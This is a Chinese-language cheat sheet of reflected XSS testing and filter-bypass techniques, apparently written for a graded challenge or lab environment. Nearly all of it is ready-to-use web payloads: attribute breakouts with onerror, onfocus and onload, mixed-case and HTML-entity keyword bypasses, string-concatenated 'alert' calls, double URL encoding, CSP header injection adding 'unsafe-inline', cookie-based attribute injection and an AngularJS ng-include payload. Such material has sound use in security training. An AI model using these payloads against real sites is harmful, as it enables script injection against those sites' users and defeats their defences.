# Reflection XSS 测试与绕过

## 1. 确认回显上下文与可利用点
- 提交 `"><h1>x</h1>` 判断能否闭合标签；提交 `"><img src=x>` 判断是否过滤尖括号/引号。
- 记录每个回显位置：文本节点、属性值（单/双/无引号）、href/URL、JS 变量、Angular 表达式、Cookie、CSP/响应头。
- 同一请求中可能多个参数或多个位置回显；选择最易触发的上下文，不要只盯第一个点。

## 2. 属性值注入与触发选择
- 双引号属性：`"><img src=x onerror=alert(1)>` 或 `" autofocus onfocus=alert(1) x="`。
- 单引号属性：`'><img src=x onerror=alert(1)>`。
- 无引号属性：`x onmouseover=alert(1)`。
- 自动触发优先：onerror/onload/onscroll；onmouseover/onfocus 需要交互，判分环境可能不触发。但 autofocus+onfocus 可使输入自动聚焦触发。
- 当标签为 `<input type=hidden>` 且无法注入新标签（`< >` 被删除）：不要用 `type=image` + `onerror`，input 上通常不自动触发；改为修改原 input 属性：`" type="text" autofocus onfocus=alert(1) x="`。
- 若 `< >` 保留，优先注入新标签 `<svg/onload=alert(1)>`，而不是依赖 input 事件。

## 3. 尖括号保留与关键字过滤的组合
- 信号：`< > "` 保留，但 on/script/href 等词被大小写敏感替换，且参数同时进入 value 和 href。
- 决策：闭合 value 后用 `&gt;&lt;` 表示尖括号，避免直接写 `< >`；协议属性用大小写 `hRef` 绕过 href 过滤；不要用 onclick（on 被替换）。最小示例：`"&gt;&lt;a hRef="javascript:alert(1)"&gt;x&lt;/a&gt;`。
- 若 on 未被过滤，才考虑事件属性；否则协议属性更稳。

## 4. 关键字过滤绕过
### 4.1 大小写混合
- 服务端字符串替换大小写敏感时，HTML 解析不区分大小写：`OnErRoR`、`hRef`、`sCrIpT`。最小示例：`"><img src=x OnErRoR=top['al'+'ert'](1)>`。

### 4.2 HTML 实体编码拆分关键字
- 将敏感字拆成数字字符引用：`java&#115;cript:alert(1)` 或 `o&#110;error=alert(1)`。若需 URL 编码传输，将 `&` 写成 `%26`，`#` 写成 `%23`。

### 4.3 JS 内部字符串拆分
- 在事件处理器或 Angular 表达式内用拼接绕过 `alert` 等字面量：`top['al'+'ert'](1)`、`top["pr"+"ompt"](1)`。

### 4.4 URL 编码/双重编码
- 若过滤发生在 URL 解码后，用 `%2573` 等双重编码。传输 HTML 实体时用 `%26%23115%3B`。

## 5. CSP 与响应头注入
- 信号：script 注入存在但被 CSP 拦截（script-src 无 unsafe-inline），且某请求参数值进入 CSP 头（如 report-uri `/csp-report?token=<token>`）未过滤分号。
- 决策：通过该参数追加 CSP 策略，允许内联脚本：`token=;script-src-elem 'unsafe-inline'`。保留原内联 payload，如 `/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'`。
- 若参数值有 URL 编码，分号可能需要解码；若只反射到响应头且未过滤分隔符，优先尝试 script-src-elem（现代浏览器）或 script-src。
- 不要只尝试 meta refresh 绕过；有头注入点时先改 CSP。

## 6. Cookie 注入
- 插入点来自 Cookie 值时，直接修改请求 Cookie 头，避免多步 Set-Cookie 覆盖。
- Cookie 值不允许 `;`、空格、换行；需 URL 编码 `"` 等特殊字符。
- 在 Cookie 中属性注入：`" type="image" src="x" onerror="alert(1)`；若 `< >` 被删除且是 hidden input，改为 `" type="text" autofocus onfocus=alert(1) x="`。

## 7. AngularJS / ng-include
- 信号：输入位于 `ng-include:{{src}}` 的表达式内，值被当作 URL 加载并编译。
- 决策：闭合 Angular 字符串，使表达式求值为同源 URL，并在该 URL 参数中携带可执行 HTML。最小示例：`'level1.php?name=<img src=x onerror=top["pr"+"ompt"](1)>'`。
- 不要优先使用 `constructor.constructor` 沙箱；ng-include 场景下沙箱通常不是最优。
- 若输入只是普通 Angular 表达式且无法加载 URL，再尝试 window 引用和字符串拆分。

## 8. 判分失败排查
- CSP 拦截内联：检查参数能否影响 CSP 头，注入 `;script-src-elem 'unsafe-inline'`。
- hidden input 事件不触发：若 `< >` 被删，用 `type=text autofocus onfocus`；不要继续用 type=image + onerror。
- 关键字 on 被替换：不要用 onclick，改用 hRef 或大小写/实体编码。
- 多反射点：优先选择 href/属性上下文，搭配 `&gt;&lt;` 与大小写绕过。
- Angular ng-include：避免沙箱，构造同源 URL 返回 HTML。
- Cookie payload 未触发：确认没有分号、空格，检查 URL 解码是否影响分句。